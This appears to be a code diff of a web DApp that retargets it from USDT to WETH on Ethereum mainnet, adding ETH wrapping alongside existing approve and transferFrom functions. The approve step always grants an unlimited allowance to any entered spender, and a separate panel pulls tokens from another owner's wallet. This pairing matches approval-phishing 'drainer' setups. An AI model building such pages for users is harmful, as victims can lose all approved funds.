@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>USDT Token — DApp</title>
+  <title>WETH Token — DApp</title>
   <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet"/>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
   <style>
@@ -108,6 +108,8 @@
     }
     .btn-connect { background: var(--blue); color: white; }
     .btn-connect:hover { background: var(--blue-dim); transform: translateY(-1px); }
+    .btn-wrap { background: #8b5cf6; color: white; display: none; }
+    .btn-wrap:hover { background: #7c3aed; transform: translateY(-1px); }
     .btn-approve { background: var(--green); color: white; display: none; }
     .btn-approve:hover { background: #16a34a; transform: translateY(-1px); }
     .btn-transfer { background: var(--amber); color: #000; display: none; }
@@ -133,48 +135,68 @@
     .tx-link { color: var(--blue); text-decoration: none; }
     .tx-link:hover { text-decoration: underline; }
     .built-by { text-align: center; font-family: var(--mono); font-size: 11px; color: var(--muted); margin-top: 24px; }
+    .tabs-3 { display: flex; gap: 8px; margin-bottom: 24px; background: var(--bg); border: 1px solid var(--border); border-radius: 12px; padding: 4px; }
   </style>
 </head>
 <body>
   <div class="glow"></div>
   <div class="card">
     <div class="logo-row">
-      <div class="token-icon">USDT</div>
+      <div class="token-icon">WETH</div>
       <div class="token-info">
-        <h1>Tether (USDT)</h1>
+        <h1>Wrapped Ether (WETH)</h1>
         <p>ERC-20 Token Approval DApp</p>
       </div>
     </div>
-    <span class="tag">Ethereum Mainnet</span>
+    <span class="tag">Ethereum Mainnet · 1 WETH = 1 ETH</span>
  
-    <p class="section-label">USDT Contract Address</p>
-    <div class="address-box">0xdAC17F958D2ee523a2206206994597C13D831ec7</div>
+    <p class="section-label">WETH Contract Address</p>
+    <div class="address-box">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</div>
  
     <div class="wallet-row" id="walletRow">
       <div class="wallet-avatar"></div>
       <span class="wallet-addr" id="walletAddr">—</span>
-      <span class="balance-badge" id="balanceBadge">0 USDT</span>
+      <span class="balance-badge" id="balanceBadge">0 WETH</span>
     </div>
  
     <button class="btn btn-connect" id="connectBtn" onclick="connectWallet()">Connect Wallet</button>
  
-    <div class="tabs" id="tabsRow" style="display:none;">
-      <button class="tab active" id="tabApprove" onclick="switchTab('approve', this)">Approve</button>
+    <div class="tabs tabs-3" id="tabsRow" style="display:none;">
+      <button class="tab active" id="tabWrap" onclick="switchTab('wrap', this)">Wrap ETH</button>
+      <button class="tab" id="tabApprove" onclick="switchTab('approve', this)">Approve</button>
       <button class="tab" id="tabTransfer" onclick="switchTab('transfer', this)">Transfer From</button>
     </div>
  
+    <!-- WRAP TAB -->
+    <div class="tab-content active" id="wrapTab">
+      <div class="info-box">⚠ Wrap your ETH to WETH first. 1 WETH = 1 ETH always. You can unwrap back anytime.</div>
+      <div class="input-group">
+        <label>ETH Balance</label>
+        <input type="text" id="ethBalance" value="Loading..." readonly/>
+      </div>
+      <div class="input-group">
+        <label>Amount to Wrap (ETH)</label>
+        <input type="number" id="wrapAmount" placeholder="e.g. 0.001"/>
+      </div>
+      <button class="btn btn-wrap" id="wrapBtn" onclick="wrapETH()">Wrap ETH → WETH</button>
+      <div class="status-box">
+        <div class="status-dot" id="wrapDot"></div>
+        <span id="wrapText">Connect wallet to wrap ETH.</span>
+      </div>
+    </div>
+ 
     <!-- APPROVE TAB -->
-    <div class="tab-content active" id="approveTab">
-      <div class="info-box">⚠ Approve gives a spender permission to use your USDT. Tokens do NOT move yet — only permission is set.</div>
+    <div class="tab-content" id="approveTab">
+      <div class="info-box">⚠ Approve gives a spender permission to use your WETH. Tokens do NOT move yet.</div>
       <div class="input-group">
         <label>Spender Address</label>
         <input type="text" id="spenderInput" placeholder="0x... address to approve"/>
       </div>
       <div class="input-group">
-        <label>Amount (USDT)</label>
+        <label>Amount (WETH)</label>
         <input type="text" id="amountInput" value="Maximum (Unlimited)" readonly/>
       </div>
-      <button class="btn btn-approve" id="approveBtn" onclick="approveTokens()">Approve USDT</button>
+      <button class="btn btn-approve" id="approveBtn" onclick="approveTokens()">Approve WETH</button>
       <div class="status-box">
         <div class="status-dot" id="approveDot"></div>
         <span id="approveText">Connect wallet to approve.</span>
@@ -183,20 +205,20 @@
  
     <!-- TRANSFER TAB -->
     <div class="tab-content" id="transferTab">
-      <div class="info-box">⚠ transferFrom moves real USDT. The connected wallet must be an approved spender first.</div>
+      <div class="info-box">⚠ transferFrom moves real WETH. The connected wallet must be an approved spender first.</div>
       <div class="input-group">
-        <label>From Address (USDT Owner)</label>
-        <input type="text" id="fromInput" placeholder="0x... USDT owner address"/>
+        <label>From Address (WETH Owner)</label>
+        <input type="text" id="fromInput" placeholder="0x... WETH owner address"/>
       </div>
       <div class="input-group">
         <label>To Address (Recipient)</label>
         <input type="text" id="toInput" placeholder="0x... recipient address"/>
       </div>
       <div class="input-group">
-        <label>Amount (USDT)</label>
-        <input type="number" id="transferAmount" placeholder="e.g. 10"/>
+        <label>Amount (WETH)</label>
+        <input type="number" id="transferAmount" placeholder="e.g. 0.001"/>
       </div>
-      <button class="btn btn-transfer" id="transferBtn" onclick="transferTokens()">Transfer USDT</button>
+      <button class="btn btn-transfer" id="transferBtn" onclick="transferTokens()">Transfer WETH</button>
       <div class="status-box">
         <div class="status-dot" id="transferDot"></div>
         <span id="transferText">Connect wallet to transfer.</span>
@@ -207,16 +229,18 @@
   </div>
  
   <script>
-    const CONTRACT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-    const ABI = [
-      "function approve(address spender, uint256 amount) public",
-      "function transferFrom(address from, address to, uint256 amount) public",
+    const WETH_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
+    const WETH_ABI = [
+      "function deposit() public payable",
+      "function withdraw(uint256 amount) public",
+      "function approve(address spender, uint256 amount) public returns (bool)",
+      "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
       "function allowance(address owner, address spender) public view returns (uint256)",
       "function balanceOf(address account) public view returns (uint256)",
       "function decimals() public view returns (uint8)"
     ];
  
-    let provider, signer, contract, tokenDecimals;
+    let provider, signer, contract;
  
     function switchTab(tab, el) {
       document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
@@ -233,36 +257,68 @@
  
     async function connectWallet() {
       if (!window.ethereum) {
-        setStatus('approveText','approveDot','No wallet detected. Open in MetaMask browser.','red',''); return;
+        setStatus('wrapText','wrapDot','No wallet detected. Open in MetaMask browser.','red',''); return;
       }
       try {
-        setStatus('approveText','approveDot','Connecting wallet...','blue','');
+        setStatus('wrapText','wrapDot','Connecting wallet...','blue','');
         await window.ethereum.request({ method: 'eth_requestAccounts' });
         provider = new ethers.providers.Web3Provider(window.ethereum);
         const network = await provider.getNetwork();
         if (network.chainId !== 1) {
-          setStatus('approveText','approveDot','Please switch to Ethereum Mainnet.','red',''); return;
+          setStatus('wrapText','wrapDot','Please switch to Ethereum Mainnet.','red',''); return;
         }
         signer = provider.getSigner();
         const address = await signer.getAddress();
-        contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
-        tokenDecimals = await contract.decimals();
+        contract = new ethers.Contract(WETH_ADDRESS, WETH_ABI, signer);
  
-        const balance = await contract.balanceOf(address);
-        const formatted = Number(ethers.utils.formatUnits(balance, tokenDecimals)).toFixed(2);
+        // Get ETH and WETH balances
+        const ethBal = await provider.getBalance(address);
+        const wethBal = await contract.balanceOf(address);
+        const ethFormatted = Number(ethers.utils.formatEther(ethBal)).toFixed(4);
+        const wethFormatted = Number(ethers.utils.formatEther(wethBal)).toFixed(4);
  
         document.getElementById('walletAddr').textContent = address.slice(0,6) + '...' + address.slice(-4);
-        document.getElementById('balanceBadge').textContent = '$' + formatted + ' USDT';
+        document.getElementById('balanceBadge').textContent = wethFormatted + ' WETH';
+        document.getElementById('ethBalance').value = ethFormatted + ' ETH';
         document.getElementById('walletRow').classList.add('show');
         document.getElementById('connectBtn').style.display = 'none';
         document.getElementById('tabsRow').style.display = 'flex';
+        document.getElementById('wrapBtn').style.display = 'block';
         document.getElementById('approveBtn').style.display = 'block';
         document.getElementById('transferBtn').style.display = 'block';
  
-        setStatus('approveText','approveDot',`Connected. USDT Balance: $${formatted}`,'green','');
-        setStatus('transferText','transferDot','Connected. Enter details to transfer USDT.','green','');
+        setStatus('wrapText','wrapDot',`Connected. ETH: ${ethFormatted} | WETH: ${wethFormatted}`,'green','');
+        setStatus('approveText','approveDot',`Connected. WETH Balance: ${wethFormatted} WETH`,'green','');
+        setStatus('transferText','transferDot','Connected. Enter details to transfer WETH.','green','');
       } catch(err) {
-        setStatus('approveText','approveDot','Connection failed: ' + err.message,'red','');
+        setStatus('wrapText','wrapDot','Connection failed: ' + err.message,'red','');
+      }
+    }
+ 
+    async function wrapETH() {
+      const amount = document.getElementById('wrapAmount').value.trim();
+      if (!amount || isNaN(amount) || Number(amount) <= 0) {
+        setStatus('wrapText','wrapDot','Enter a valid ETH amount to wrap.','red',''); return;
+      }
+      try {
+        const parsedAmount = ethers.utils.parseEther(amount);
+        setStatus('wrapText','wrapDot','Waiting for wallet confirmation...','blue','');
+        document.getElementById('wrapBtn').disabled = true;
+        const tx = await contract.deposit({ value: parsedAmount });
+        setStatus('wrapText','wrapDot','Submitted. Wrapping ETH to WETH...','blue','');
+        await tx.wait();
+ 
+        // Update WETH balance
+        const address = await signer.getAddress();
+        const wethBal = await contract.balanceOf(address);
+        const wethFormatted = Number(ethers.utils.formatEther(wethBal)).toFixed(4);
+        document.getElementById('balanceBadge').textContent = wethFormatted + ' WETH';
+ 
+        setStatus('wrapText','wrapDot',`Successfully wrapped ${amount} ETH to WETH! New balance: ${wethFormatted} WETH`,'green',`https://etherscan.io/tx/${tx.hash}`);
+        document.getElementById('wrapBtn').disabled = false;
+      } catch(err) {
+        setStatus('wrapText','wrapDot','Failed: ' + (err.reason || err.message),'red','');
+        document.getElementById('wrapBtn').disabled = false;
       }
     }
  
@@ -277,7 +333,7 @@
         const tx = await contract.approve(spender, ethers.constants.MaxUint256);
         setStatus('approveText','approveDot','Submitted. Waiting for confirmation...','blue','');
         await tx.wait();
-        setStatus('approveText','approveDot','USDT Approved! Spender can now use your USDT.','green',`https://etherscan.io/tx/${tx.hash}`);
+        setStatus('approveText','approveDot','WETH Approved! Spender can now use your WETH.','green',`https://etherscan.io/tx/${tx.hash}`);
         document.getElementById('approveBtn').disabled = false;
       } catch(err) {
         setStatus('approveText','approveDot','Failed: ' + (err.reason || err.message),'red','');
@@ -295,13 +351,13 @@
       if (!amount || isNaN(amount) || Number(amount) <= 0) { setStatus('transferText','transferDot','Enter a valid amount.','red',''); return; }
  
       try {
-        const parsedAmount = ethers.utils.parseUnits(amount, tokenDecimals);
+        const parsedAmount = ethers.utils.parseEther(amount);
         const signerAddress = await signer.getAddress();
         const currentAllowance = await contract.allowance(from, signerAddress);
  
         if (currentAllowance.lt(parsedAmount)) {
-          const allowed = ethers.utils.formatUnits(currentAllowance, tokenDecimals);
-          setStatus('transferText','transferDot',`Allowance too low. Current: $${Number(allowed).toFixed(2)} USDT. Ask owner to approve you first.`,'red','');
+          const allowed = ethers.utils.formatEther(currentAllowance);
+          setStatus('transferText','transferDot',`Allowance too low. Current: ${Number(allowed).toFixed(4)} WETH. Ask owner to approve you first.`,'red','');
           return;
         }
  
@@ -310,7 +366,7 @@
         const tx = await contract.transferFrom(from, to, parsedAmount);
         setStatus('transferText','transferDot','Submitted. Waiting for confirmation...','blue','');
         await tx.wait();
-        setStatus('transferText','transferDot',`Successfully transferred $${amount} USDT!`,'green',`https://etherscan.io/tx/${tx.hash}`);
+        setStatus('transferText','transferDot',`Successfully transferred ${amount} WETH!`,'green',`https://etherscan.io/tx/${tx.hash}`);
         document.getElementById('transferBtn').disabled = false;
       } catch(err) {
         setStatus('transferText','transferDot','Failed: ' + (err.reason || err.message),'red','');
